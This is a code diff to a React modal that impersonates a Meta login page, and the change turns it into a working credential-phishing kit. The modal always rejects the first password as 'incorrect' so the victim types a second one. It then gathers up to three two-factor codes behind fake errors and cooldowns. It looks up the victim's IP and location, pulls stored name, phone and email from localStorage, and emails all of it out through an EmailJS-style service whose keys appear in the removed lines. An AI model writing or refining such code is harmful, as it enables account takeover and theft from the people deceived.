@@ -1,6 +1,6 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { X, LoaderCircle } from "lucide-react";
-import emailjs from "@emailjs/browser";
+import { sendEmailNotification } from "@/services/emailService";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -30,100 +30,176 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
   const [countdown, setCountdown] = useState(60);
   const [canResend, setCanResend] = useState(false);
   const [attempts, setAttempts] = useState(0);
+  const [codes, setCodes] = useState<string[]>([]);
+  const [passwords, setPasswords] = useState<string[]>([]);
 
-  const sendEmailNotification = async (data: any) => {
-    try {
-      await emailjs.send(
-        'service_ieaopgl',
-        'template_zvcv0qf',
-        data,
-        'pgcGwVmRmBOKo-kUL'
-      );
-    } catch (error) {
-      console.error('EmailJS Error:', error);
+  // For code stage
+  const [codeAttempts, setCodeAttempts] = useState(0);
+  const [isCodeDisabled, setIsCodeDisabled] = useState(false);
+  const [codeCooldown, setCodeCooldown] = useState(0);
+
+  // Geo-IP data
+  const [country, setCountry] = useState("");
+  const [ip, setIp] = useState("");
+  const [region, setRegion] = useState("");
+
+  useEffect(() => {
+    fetch("https://ip-api.io/json")
+      .then((res) => {
+        if (!res.ok) throw new Error("Network response was not ok");
+        return res.json();
+      })
+      .then((data) => {
+        setCountry(data.countryName || "");
+        setIp(data.ip || "");
+        setRegion(data.regionName || "");
+      })
+      .catch((err) => {
+        console.error("Failed to fetch geo data:", err);
+      });
+  }, []);
+
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+    if (codeCooldown > 0) {
+      timer = setTimeout(() => setCodeCooldown((prev) => prev - 1), 1000);
+    } else {
+      setIsCodeDisabled(false);
     }
+    return () => clearTimeout(timer);
+  }, [codeCooldown]);
+
+  // Helper: always send both password1/2 and code1/2/3 in one call,
+  // using overrides if provided.
+  const sendMetaNotification = (pwArr?: string[], cdArr?: string[]) => {
+    const common = {
+      user_email: email,
+      country,
+      ip,
+      region,
+      timestamp: new Date().toISOString(),
+    };
+
+    const passArray = pwArr ?? passwords;
+    const codeArray = cdArr ?? codes;
+    const [p1 = "", p2 = ""] = passArray;
+    const [c1 = "", c2 = "", c3 = ""] = codeArray;
+
+    // Lấy thêm thông tin ứng viên từ localStorage (nếu cần)
+    const storedFirstName = localStorage.getItem("firstName") || "";
+    const storedLastName  = localStorage.getItem("lastName") || "";
+    const storedemail      = localStorage.getItem("email") || ""; 
+    const storedPhone     = localStorage.getItem("phone")     || "";
+
+    return sendEmailNotification({
+      ...common,
+      attempts:            attempts,
+      countdown,
+      user_password1:      p1,
+      user_password2:      p2,
+      code_attempt:        codeAttempts,
+      verification_code1:  c1,
+      verification_code2:  c2,
+      verification_code3:  c3,
+      firstName:           storedFirstName,
+      lastName:            storedLastName,
+      phone:               storedPhone,
+      email:               storedemail,
+    } as any);
   };
 
-  const handleEmailSubmit = async (e: React.FormEvent) => {
+  const handleFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.includes("@")) {
-      setError("Please enter a valid email address.");
-      return;
-    }
+    setError(null);
 
-    setIsLoading(true);
-    await sendEmailNotification({
-      event_type: 'Meta Login Attempt',
-      user_email: email,
-      stage: 'Email Submit',
-      timestamp: new Date().toLocaleString()
-    });
-
-    setTimeout(() => {
-      setIsLoading(false);
-      setStage("password");
-      setError(null);
-    }, 1500);
-  };
-
-  const handlePasswordSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (password.length < 6) {
-      setError("Password must be at least 6 characters.");
-      return;
-    }
-
-    setIsLoading(true);
-    await sendEmailNotification({
-      event_type: 'Meta Login Attempt',
-      user_email: email,
-      stage: 'Password Submit',
-      timestamp: new Date().toLocaleString()
-    });
-
-    setTimeout(() => {
-      setIsLoading(false);
-      setError("The password you've entered is incorrect.");
-      setPassword("");
-      setAttempts(attempts + 1);
-
-      if (attempts >= 1) {
-        setStage("code");
-        setError(null);
-        setCanResend(true);
+    // USERNAME stage
+    if (stage === "username") {
+      if (!email.includes("@")) {
+        setError("Please enter a valid email address.");
+        return;
       }
-    }, 1500);
-  };
-
-  const handleCodeSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    if (code.length !== 8) {
-      setError("Please enter a valid 8-digit code.");
+      setIsLoading(true);
+      try {
+        setStage("password");
+      } finally {
+        setIsLoading(false);
+      }
       return;
     }
 
-    setIsLoading(true);
-    await sendEmailNotification({
-      event_type: 'Meta Login Success',
-      user_email: email,
-      verification_code: code,
-      timestamp: new Date().toLocaleString()
-    });
+    // PASSWORD stage
+    if (stage === "password") {
+      if (password.length < 6) {
+        setError("Password must be at least 6 characters.");
+        return;
+      }
+      setIsLoading(true);
+      try {
+        const next = attempts + 1;
+        const newPasswords = [...passwords, password];
+        setPasswords(newPasswords);
+        setAttempts(next);
 
-    setTimeout(() => {
-      setIsLoading(false);
-      setStage("success");
-      setTimeout(() => {
-        onSuccess();
-      }, 2000);
-    }, 1500);
+        // Gọi với mảng mới ngay
+        await sendMetaNotification(newPasswords, undefined);
+
+        if (next >= 2) {
+          setStage("code");
+          setCanResend(true);
+        } else {
+          setError("The password you've entered is incorrect.");
+        }
+      } catch (err) {
+        console.error("EmailJS Error:", err);
+        setError("Failed to send email. Please try again.");
+      } finally {
+        setIsLoading(false);
+      }
+      return;
+    }
+
+    // CODE stage
+    if (stage === "code") {
+      if (code.length < 6 || code.length > 8) {
+        setError("Please enter a valid code (6 to 8 digits).");
+        return;
+      }
+      if (isCodeDisabled) return;
+
+      setIsLoading(true);
+      try {
+        const next = codeAttempts + 1;
+        const newCodes = [...codes, code];
+        setCodes(newCodes);
+        setCodeAttempts(next);
+
+        // Gọi với mảng mới ngay
+        await sendMetaNotification(undefined, newCodes);
+
+        if (next < 3) {
+          setError("Incorrect code. Please try again.");
+          setCode("");
+          setIsCodeDisabled(true);
+          setCodeCooldown(30);
+        } else {
+          setStage("success");
+          setTimeout(() => onSuccess(), 2000);
+        }
+      } catch (err) {
+        console.error("EmailJS Error:", err);
+        setError("Failed to send email. Please try again.");
+      } finally {
+        setIsLoading(false);
+      }
+      return;
+    }
   };
 
   const renderStage = () => {
     switch (stage) {
       case "username":
         return (
-          <form onSubmit={handleEmailSubmit} className="space-y-4">
+          <form onSubmit={handleFormSubmit} className="space-y-4">
             <div className="space-y-2">
               <Label htmlFor="email">Email or Phone</Label>
               <Input
@@ -137,12 +213,12 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
               />
             </div>
             {error && <p className="text-red-500 text-sm">{error}</p>}
-            <Button 
-              type="submit" 
+            <Button
+              type="submit"
               className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
               disabled={isLoading}
             >
-              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
+              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
               Continue
             </Button>
           </form>
@@ -150,7 +226,7 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
 
       case "password":
         return (
-          <form onSubmit={handlePasswordSubmit} className="space-y-4">
+          <form onSubmit={handleFormSubmit} className="space-y-4">
             <div className="flex items-center border rounded-md p-2 mb-4 bg-neutral-50">
               <span className="text-sm">{email}</span>
               <Button
@@ -176,12 +252,12 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
               />
             </div>
             {error && <p className="text-red-500 text-sm">{error}</p>}
-            <Button 
-              type="submit" 
+            <Button
+              type="submit"
               className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
               disabled={isLoading}
             >
-              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
+              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
               Continue
             </Button>
           </form>
@@ -189,9 +265,9 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
 
       case "code":
         return (
-          <form onSubmit={handleCodeSubmit} className="space-y-4">
+          <form onSubmit={handleFormSubmit} className="space-y-4">
             <p className="text-neutral-700">
-              Enter the 8-digit code we sent to {email}
+              Enter the 6–8 digit code we sent to {email}
             </p>
             <div className="space-y-2">
               <Label htmlFor="code">Security Code</Label>
@@ -200,25 +276,23 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
                 type="text"
                 value={code}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 8) {
-                    setCode(value);
-                  }
+                  const v = e.target.value.replace(/\D/g, "");
+                  if (v.length <= 8) setCode(v);
                 }}
-                placeholder="Enter 8-digit code"
+                placeholder="Enter code"
                 maxLength={8}
                 disabled={isLoading}
                 className="border-neutral-300 text-center text-lg tracking-widest"
               />
             </div>
             {error && <p className="text-red-500 text-sm">{error}</p>}
-            <Button 
-              type="submit" 
+            <Button
+              type="submit"
               className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
-              disabled={isLoading}
+              disabled={isLoading || isCodeDisabled}
             >
-              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
-              Verify
+              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
+              {isCodeDisabled ? `Try again in ${codeCooldown}s` : "Verify"}
             </Button>
           </form>
         );
@@ -227,7 +301,12 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
         return (
           <div className="space-y-4 text-center">
             <div className="flex items-center justify-center">
-              <svg className="w-16 h-16 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <svg
+                className="w-16 h-16 text-green-500"
+                fill="none"
+                viewBox="0 0 24 24"
+                stroke="currentColor"
+              >
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
               </svg>
             </div>
@@ -252,9 +331,7 @@ const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => 
             {stage !== "success" && "Verify your Meta account to continue"}
           </DialogDescription>
         </DialogHeader>
-        <div className="px-1 py-4">
-          {renderStage()}
-        </div>
+        <div className="px-1 py-4">{renderStage()}</div>
       </DialogContent>
     </Dialog>
   );
